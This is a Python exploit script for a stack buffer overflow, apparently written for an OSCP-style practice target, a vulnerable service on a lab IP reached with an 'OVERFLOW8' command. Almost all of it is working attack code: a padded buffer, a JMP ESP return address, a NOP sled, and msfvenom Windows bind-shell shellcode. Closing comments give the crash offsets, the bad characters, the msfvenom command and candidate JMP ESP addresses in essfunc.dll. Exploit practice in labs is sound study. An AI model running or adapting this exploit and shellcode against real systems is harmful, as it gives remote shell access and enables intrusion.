import socket
import time


# Fuzzing shows crash at 1800 bytes input

host = "10.10.5.232"
port = 1337

offset = 1786
junk_data = bytearray(b"A" * offset)
return_address = bytearray(b"\xaf\x11\x50\x62")

nop_num_bytes = 100
nop_sled = bytearray(b"\x90" * nop_num_bytes)

shell_code = (
    b"\xbe\x3b\x17\x26\x08\xdb\xd3\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
    b"\x53\x31\x72\x12\x03\x72\x12\x83\xf9\x13\xc4\xfd\x01\xf3\x8a"
    b"\xfe\xf9\x04\xeb\x77\x1c\x35\x2b\xe3\x55\x66\x9b\x67\x3b\x8b"
    b"\x50\x25\xaf\x18\x14\xe2\xc0\xa9\x93\xd4\xef\x2a\x8f\x25\x6e"
    b"\xa9\xd2\x79\x50\x90\x1c\x8c\x91\xd5\x41\x7d\xc3\x8e\x0e\xd0"
    b"\xf3\xbb\x5b\xe9\x78\xf7\x4a\x69\x9d\x40\x6c\x58\x30\xda\x37"
    b"\x7a\xb3\x0f\x4c\x33\xab\x4c\x69\x8d\x40\xa6\x05\x0c\x80\xf6"
    b"\xe6\xa3\xed\x36\x15\xbd\x2a\xf0\xc6\xc8\x42\x02\x7a\xcb\x91"
    b"\x78\xa0\x5e\x01\xda\x23\xf8\xed\xda\xe0\x9f\x66\xd0\x4d\xeb"
    b"\x20\xf5\x50\x38\x5b\x01\xd8\xbf\x8b\x83\x9a\x9b\x0f\xcf\x79"
    b"\x85\x16\xb5\x2c\xba\x48\x16\x90\x1e\x03\xbb\xc5\x12\x4e\xd4"
    b"\x2a\x1f\x70\x24\x25\x28\x03\x16\xea\x82\x8b\x1a\x63\x0d\x4c"
    b"\x5c\x5e\xe9\xc2\xa3\x61\x0a\xcb\x67\x35\x5a\x63\x41\x36\x31"
    b"\x73\x6e\xe3\xac\x7b\xc9\x5c\xd3\x86\xa9\x0c\x53\x28\x42\x47"
    b"\x5c\x17\x72\x68\xb6\x30\x1b\x95\x39\x2f\x80\x10\xdf\x25\x28"
    b"\x75\x77\xd1\x8a\xa2\x40\x46\xf4\x80\xf8\xe0\xbd\xc2\x3f\x0f"
    b"\x3e\xc1\x17\x87\xb5\x06\xac\xb6\xc9\x02\x84\xaf\x5e\xd8\x45"
    b"\x82\xff\xdd\x4f\x74\x63\x4f\x14\x84\xea\x6c\x83\xd3\xbb\x43"
    b"\xda\xb1\x51\xfd\x74\xa7\xab\x9b\xbf\x63\x70\x58\x41\x6a\xf5"
    b"\xe4\x65\x7c\xc3\xe5\x21\x28\x9b\xb3\xff\x86\x5d\x6a\x4e\x70"
    b"\x34\xc1\x18\x14\xc1\x29\x9b\x62\xce\x67\x6d\x8a\x7f\xde\x28"
    b"\xb5\xb0\xb6\xbc\xce\xac\x26\x42\x05\x75\x56\x09\x07\xdc\xff"
    b"\xd4\xd2\x5c\x62\xe7\x09\xa2\x9b\x64\xbb\x5b\x58\x74\xce\x5e"
    b"\x24\x32\x23\x13\x35\xd7\x43\x80\x36\xf2"
)

buffer = junk_data + return_address + nop_sled + shell_code

def sendExploit(host, port, buffer):
    prefix = bytearray("OVERFLOW8 ".encode("ascii"))
    suffix = bytearray("".encode("ascii"))

    exploitInput = prefix + buffer + suffix

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as csocket:
        csocket.connect((host, port))
        print("[+] Client connected.")

        print(f"[!] Data received from server: {csocket.recv(1024).decode('ascii')}")

        print("[+] Attempting to send exploit input...")
        csocket.send(exploitInput)


# Send data
sendExploit(host, port, buffer)


        
# Comments:

# EIP at crash: 68433568
# ESP at crash: 0183FA30 -> 37684336

# EIP Pattern Offset: 1786
# ESP (0x0183fa30) points at offset 1790 

# ESP points inside of the pattern
# We can use `JMP ESP` instruction
# to jump to our exploit input

# Bad chars: 0x00, 0x1d, 0x2e, 0xc7, 0xee

# msfvenom -p windows/shell_bind_tcp -f c -a x86 --platform windows -b '\x00\x1d\x2e\xc7\xee'

# `JMP ESP` Addresses without Bad chars
# 0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
# 0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
